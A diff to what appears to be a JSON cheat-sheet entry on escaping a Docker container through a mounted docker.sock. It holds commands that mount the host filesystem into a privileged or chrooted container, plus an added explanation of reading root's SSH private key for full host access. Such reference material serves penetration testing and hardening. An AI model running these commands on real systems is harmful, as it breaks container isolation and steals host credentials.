@@ -107,5 +107,6 @@
       "label": "Use a static docker binary against the socket",
       "command": "/tmp/docker -H unix:///app/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
     }
-  ]
+  ],
+  "explain": "Talks to the host Docker daemon through a docker.sock mounted in the container:\n  /tmp/docker              an uploaded docker client\n  -H unix:///app/docker.sock   target the mounted host daemon socket\n  run --rm -d --privileged   launch a throwaway privileged container\n  -v /:/hostsystem         bind-mount the host root filesystem into it\n  main_app                 the image to run\nExec into it and read /hostsystem/root/.ssh/id_rsa - full host access. A one-liner alpine chroot variant does the same."
 }
